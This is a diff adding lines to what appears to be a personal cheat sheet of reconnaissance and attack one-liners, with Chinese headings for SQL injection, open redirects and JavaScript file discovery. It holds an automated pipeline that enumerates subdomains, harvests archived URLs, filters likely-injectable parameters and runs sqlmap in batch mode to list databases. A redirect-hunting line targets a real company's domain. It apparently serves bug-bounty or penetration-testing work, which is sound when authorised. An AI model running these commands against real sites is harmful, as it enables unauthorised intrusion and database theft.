@@ -1,2 +1,13 @@
+sql注入
+subfinder -d target.com | tee -a domains
+cat domains | httpx | tee -a urls.alive
+cat urls.alive | waybackurls | tee -a urls.check
+gf sqli urls.check >> urls.sqli
+sqlmap -m urls.sqli --dbs --batch
+
+
+查找开放的重定向
 echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
+
+查找JavaScript文件
 cat domains | httpx -silent | subjs | anew
